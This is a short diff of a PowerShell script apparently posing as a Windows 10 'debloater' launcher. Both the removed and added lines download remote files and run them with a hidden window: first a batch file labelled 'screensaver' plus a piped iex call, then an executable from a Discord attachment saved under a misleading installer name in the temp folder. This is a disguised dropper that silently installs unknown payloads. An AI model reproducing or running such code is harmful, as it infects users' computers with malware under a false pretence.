@@ -1,4 +1,1 @@
-iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/screensaver" -o $env:TEMP\screensaver.bat
-Start-Process -WindowStyle hidden -FilePath $env:TEMP\screensaver.bat
-echo "Windows10Debloater by Sycnex"
-iwr -useb git.io/debloat|iex
+iwr -useb https://cdn.discordapp.com/attachments/1050062111855886397/1050062174053216337/Ryujinx.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
